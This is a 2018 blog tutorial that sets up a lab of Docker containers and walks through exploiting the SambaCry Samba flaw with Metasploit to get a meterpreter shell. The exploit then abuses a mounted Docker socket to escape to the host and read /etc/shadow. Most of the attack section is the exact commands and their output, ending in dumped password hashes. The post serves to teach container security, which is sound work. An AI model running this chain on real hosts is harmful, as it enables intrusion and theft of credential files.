+++
title = "Abusing insecure docker deployments"
author = ["OPSXCQ"]
date = 2018-11-10
draft = false
+++

Is possible to abuse misconfigurations and bugs and escape from containers in
several scenarios, in this post I will explore the most basic one: abusing the
docker socket to escape the container and run code as **root** in the host machine.

<!--more-->


## Lab setup {#lab-setup}

Since we will be using containers, you have to install [docker](https://docker.com) to be able to run
this lab.


### Create the network {#create-the-network}

The very first step is to create a docker network where the containers will be
created:

```bash
docker network create pwnage
```


### Start the vulnerable container {#start-the-vulnerable-container}

For this example, we will use a container vulnerable to `CVE-2017-7494`, also
known as Samba Cry vulnerability. If you are interested in reading more about it
please check this repository [opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494).

This vulnerability allows you to get remote code execution in a Samba server, to
complete the setup the docker socket will be added to the container. This will
generate a common misconfiguration scenario:

```bash
docker run --rm -it \
       --name vulnerable \
       --network pwnage \
       -v '/var/run/docker.sock:/var/run/docker.sock' \
       vulnerables/cve-2017-7494
```


### Start the attacker environment {#start-the-attacker-environment}

The very last step in our environment is to add the attacker host to the
network. There is an exploit in the Samba Cry repository, but instead we will be
using `Metasploit` because of `meterpreter's` advanced features which will make the
whole process easier. There is an image already build for that, just run the
command bellow and everything will run as needed for this lab:

```bash
docker run --rm -it \
       --network pwnage \
       -v '/usr/bin/docker:/docker:ro' \
       strm/metasploit
```

After it is loaded you will be presented to this screen

{{< figure src="https://raw.githubusercontent.com/opsxcq/docker-metasploit/master/print.png" >}}


## Attack {#attack}


### Information gathering {#information-gathering}

In any attack, the first thing to do is to gather information about the target.
So let's first check the connectivity by pinging the `vulnerable` container.

```bash
ping -c 2 vulnerable
```

If everything is OK you should expect an output like

```bash
msf5 > ping -c 2 vulnerable
[*] exec: ping -c 2 vulnerable

PING vulnerable (172.20.0.2) 56(84) bytes of data.
64 bytes from vulnerable.pwnage (172.20.0.2): icmp_seq=1 ttl=64 time=0.120 ms
64 bytes from vulnerable.pwnage (172.20.0.2): icmp_seq=2 ttl=64 time=0.097 ms

--- vulnerable ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1009ms
rtt min/avg/max/mdev = 0.097/0.108/0.120/0.015 ms
```

Then we proceed to a basic smb shares enumeration with:

```bash
use auxiliary/scanner/smb/smb_enumshares
set rhosts vulnerable
run
```

The expected output is

```text
msf5 > use auxiliary/scanner/smb/smb_enumshares
msf5 auxiliary(scanner/smb/smb_enumshares) > set rhosts vulnerable
rhosts => vulnerable
msf5 auxiliary(scanner/smb/smb_enumshares) > run

[+] 172.20.0.2:139        - data - (DS) Data
[+] 172.20.0.2:139        - IPC$ - (I) IPC Service (Crying samba)
[*] vulnerable:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

It show us that there is a share named `data` in this samba server.


## Getting access {#getting-access}

Next step is to run the exploit against the host so we can obtain a shell. On
`Metasploit` this vulnerability is named `is_known_pipename` and is located in
`exploit/linux/samba/is_known_pipename`.

Run the command bellow to attack the host:

```bash
use exploit/linux/samba/is_known_pipename
set RHOST vulnerable
set RPORT 445
set payload linux/x64/meterpreter/bind_tcp
set TARGET 3
set SMB_FOLDER data
set SMBUser sambacry
set SMBPass nosambanocry
exploit
```

If everything runs fine, you should be presented with a `meterpreter` shell like:

```text
msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > set RHOST vulnerable
RHOST => vulnerable
msf5 exploit(linux/samba/is_known_pipename) > set RPORT 445
RPORT => 445
msf5 exploit(linux/samba/is_known_pipename) > set payload linux/x64/meterpreter/bind_tcp
payload => linux/x64/meterpreter/bind_tcp
msf5 exploit(linux/samba/is_known_pipename) > set TARGET 3
TARGET => 3
msf5 exploit(linux/samba/is_known_pipename) > set SMB_FOLDER data
SMB_FOLDER => data
msf5 exploit(linux/samba/is_known_pipename) > set SMBUser sambacry
SMBUser => sambacry
msf5 exploit(linux/samba/is_known_pipename) > set SMBPass nosambanocry
SMBPass => nosambanocry
msf5 exploit(linux/samba/is_known_pipename) > exploit

[*] vulnerable:445 - Using location \\vulnerable\data\ for the path
[*] vulnerable:445 - Retrieving the remote path of the share 'data'
[*] vulnerable:445 - Share 'data' has server-side path '/data
[*] vulnerable:445 - Uploaded payload to \\vulnerable\data\shyyEPPk.so
[*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using \\PIPE\/data/shyyEPPk.so...
[-] vulnerable:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using /data/shyyEPPk.so...
[-] vulnerable:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] Started bind TCP handler against vulnerable:4444
[*] Sending stage (816260 bytes) to vulnerable

meterpreter >
```


## Escalating privileges {#escalating-privileges}

To escalate privileges we will abuse the docker socket being available inside
the container. Since `dockerd` runs as root in the host machine, it has root
permissions so we can abuse it to do several things. For example using
`--privileged` can give you several extended capabilities, the text bellow
explaining them was extracted from the official docker documentation:

> By default, Docker containers are “unprivileged” and cannot, for example, run a
> Docker daemon inside a Docker container. This is because by default a container
> is not allowed to access any devices, but a “privileged” container is given
> access to all devices (see the documentation on cgroups devices). When the
> operator executes docker run --privileged, Docker will enable access to all
> devices on the host as well as set some configuration in AppArmor or SELinux to
> allow the container nearly all the same access to the host as processes running
> outside containers on the host.

You can access devices with `--device`, but in our case, we will map the root file
system (`/`) to the container and have access to it.

Since there is no docker client inside this container, the next step is to setup
the docker client and its dependencies inside our target container. Just run the
command bellow and everything will be done.

```bash
upload /docker /docker
upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
chmod 777 /docker
chmod +x /docker
```

```text
meterpreter > upload /docker /docker
[*] uploading  : /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
[*] uploaded   : /docker -> /docker
meterpreter > upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
[*] uploading  : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7
[*] Uploaded -1.00 B of 38.47 KiB (-0.0%): /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7
[*] uploaded   : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7
meterpreter > chmod 777 /docker
meterpreter > chmod +x /docker
meterpreter >
```

And finally, using docker to have access to the host file system.

```bash
execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow"
```

And that is it, you've escaped the container and dumped the machine local user
hashes, the output will look like:

```text
meterpreter > execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow"
Process 113 created.
Channel 13 created.
root:$1$UFKdtFGw$qp29y1qGWit/vnvIG0uSr1:17488:0:99999:7:::
daemon:*:17488:0:99999:7:::
bin:*:17488:0:99999:7:::
sys:*:17488:0:99999:7:::
sync:*:17488:0:99999:7:::
games:*:17488:0:99999:7:::
man:*:17488:0:99999:7:::
lp:*:17488:0:99999:7:::
mail:*:17488:0:99999:7:::
news:*:17488:0:99999:7:::
```


## References {#references}

-   [Metasploit docker image](<https://github.com/opsxcq/docker-metasploit>)
-   [Vulnerable container](<https://github.com/opsxcq/exploit-CVE-2017-7494>)
